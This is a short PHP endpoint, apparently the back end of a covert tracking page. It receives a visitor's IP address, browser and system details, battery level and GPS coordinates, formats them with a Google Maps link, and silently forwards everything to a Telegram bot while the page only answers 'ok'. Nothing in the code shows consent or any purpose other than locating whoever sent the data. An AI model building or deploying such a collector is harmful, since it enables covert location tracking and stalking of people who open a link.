<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';

$input = json_decode(file_get_contents('php://input'), true);

$ip        = $input['ip'] ?? 'Desconocida';
$ua        = $input['ua'] ?? 'Desconocido';
$browser   = $input['browser'] ?? 'Desconocido';
$appver    = $input['appver'] ?? 'Desconocida';
$os        = $input['os'] ?? 'Desconocido';
$lang      = $input['lang'] ?? 'Desconocido';
$battery   = $input['battery'] ?? 'Desconocida';
$lat       = $input['lat'] ?? 'No disponible';
$lon       = $input['lon'] ?? 'No disponible';
$accuracy  = $input['accuracy'] ?? 'No disponible';
$ts        = gmdate('c');

$msg = "📱 <b>Info del dispositivo</b>\n".
       "🌐 IP: $ip\n".
       "🖥 Navegador: $browser\n".
       "🧩 User-Agent: $ua\n".
       "💻 Versión App: $appver\n".
       "🖲 Sistema: $os\n".
       "🌐 Idioma: $lang\n".
       "🔋 Batería: $battery%\n".
       "\n📍 Nueva ubicación\n".
       "📌 Lat: $lat\n".
       "📌 Lon: $lon\n".
       "🎯 Precisión: $accuracy m\n".
       "⏰ Hora: $ts\n".
       ($lat !== 'No disponible' && $lon !== 'No disponible' 
        ? "🌍 Google Maps: https://www.google.com/maps?q=$lat,$lon" 
        : "");

send_to_telegram($msg);

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
